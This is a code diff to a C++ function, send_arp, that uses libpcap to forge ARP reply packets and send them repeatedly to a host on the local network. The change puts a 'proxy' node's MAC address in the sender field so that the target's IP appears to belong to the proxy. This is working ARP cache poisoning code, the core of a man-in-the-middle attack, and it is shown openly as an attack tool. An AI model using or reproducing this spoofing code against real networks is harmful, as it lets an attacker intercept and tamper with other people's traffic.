@@ -8,7 +8,7 @@
 #include "node.h"
 using namespace std;
 
-void send_arp(Node *sender, Node *target){
+void send_arp(Node *sender, Node *target, Node *proxy){
 	extern int status;
         pcap_t *handle;
 	char *errbuf = NULL;
@@ -27,9 +27,9 @@ void send_arp(Node *sender, Node *target){
         u_char Protocol_Size[] = { 0x04 };		
         u_char Opcode[] = { 0x00, 0x02 };               // ARP Reply
 
-        memcpy(packet + i, sender->mac_addr, sizeof(sender->mac_addr));			//sender mac
+        memcpy(packet + i, sender->mac_addr, sizeof(sender->mac_addr));			//dest
         i += sizeof(sender->mac_addr);
-        memcpy(packet + i, sender->iface_mac_addr, sizeof(sender->iface_mac_addr));     // src mac
+        memcpy(packet + i, sender->iface_mac_addr, sizeof(sender->iface_mac_addr));     		// src
         i += sizeof(sender->iface_mac_addr);
         memcpy(packet + i, ether_type, sizeof(ether_type));
         i += sizeof(ether_type);
@@ -43,8 +43,8 @@ void send_arp(Node *sender, Node *target){
         i += sizeof(Protocol_Size);
         memcpy(packet + i, Opcode, sizeof(Opcode));
         i += sizeof(Opcode);
-        memcpy(packet + i, sender->iface_mac_addr, sizeof(sender->iface_mac_addr));     // sender_mac
-        i += sizeof(sender->iface_mac_addr);
+        memcpy(packet + i, proxy->mac_addr, sizeof(proxy->mac_addr));     // sender_mac
+        i += sizeof(proxy->mac_addr);
         memcpy(packet + i, target->ip_addr, sizeof(target->ip_addr));
         i += sizeof(target->ip_addr);
         memcpy(packet + i, sender->mac_addr, sizeof(sender->mac_addr));             //traget mac
@@ -56,7 +56,7 @@ void send_arp(Node *sender, Node *target){
 		if(status == 0)
 			break;
 		pcap_sendpacket(handle, packet, i);
-		cout << "[*] Send "<< " ARP reply packet to " << sender->ip_addr_str << endl;
+		cout << "[*] Send "<< " ARP reply packet to " << sender->ip_addr_str << "from " << proxy->ip_addr_str << endl;
 		sleep(2);
 	}
 	return;
